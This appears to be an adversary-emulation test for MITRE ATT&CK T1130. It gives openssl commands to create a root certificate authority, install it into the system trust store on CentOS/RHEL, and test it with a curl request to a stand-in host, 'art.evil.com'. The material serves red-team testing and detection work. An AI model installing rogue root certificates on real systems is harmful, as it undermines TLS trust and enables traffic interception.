# Install Root Certificate

## MITRE ATT&CK Technique:
	[T1130](https://attack.mitre.org/wiki/Technique/T1130)


## Create a root CA with openssl
    openssl genrsa -out rootCA.key 4096
    openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -out rootCA.crt

## Install root CA on CentOS/RHEL 5 and below
    cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt

## Install root CA on CentOS/RHEL 6 and above
    cp rootCA.crt /etc/pki/ca-trust/source/anchors/
    update-ca-trust

## Testing the trusted certificate.
To test the new trust, apply the root certificate or another signed with it to a SSL/TLS web service and attempt a connection with curl or wget.

    curl https://art.evil.com
